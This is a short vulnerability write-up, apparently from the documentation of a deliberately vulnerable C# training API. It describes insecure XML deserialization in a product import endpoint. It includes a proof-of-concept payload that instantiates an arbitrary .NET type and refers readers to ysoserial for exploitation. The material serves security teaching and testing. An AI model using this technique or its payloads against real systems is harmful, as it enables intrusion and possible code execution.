# Insecure Deserialization

## Overview

An insecure deserialization vulnerability exists in the Product `import` endpoint at the following URL:

```
http://rws.local:5000/api/products/import
```

## Exploitation

An attacker can send arbitrary XML formatted serialized object to the target API and have the application deserialize the same.

A payload such as below will deserialize 2 entities of type `Product` by the application:

```xml
<?xml version="1.0"?>
<Entities xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <Entity Type="dvcsharp_core_api.Models.Product">
    	<Product>
	        <name>Test Product 1</name>
	        <description>Test Product Description</description>
	        <skuId>PROD-001</skuId>
	        <unitPrice>0</unitPrice>
        </Product>
    </Entity>
    <Entity Type="dvcsharp_core_api.Models.Product">
    	<Product>
        	<name>Test Product 11</name>
        	<description>Test Product Description</description>
        	<skuId>PROD-0011</skuId>
        	<unitPrice>100</unitPrice>
        </Product>
    </Entity>
</Entities>
```

However, a request such as below, allows an attacker to construct arbitrary object with constructor parameters.

```xml
<?xml version="1.0"?>
<Entities xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <Entity Type="System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    	<boolean>false</boolean>
    </Entity>
</Entities>
```

## Impact

An attacker can exploit this weakness by:

* Instantiating arbitrary objects available in the application namespace
* Leverage constructor logic to exploit the system by supplying arbitrary parameters to the class constructor

Automated tools such as `ysoserial` can be used to assist in exploitation.

## Reference

* https://github.com/frohoff/ysoserial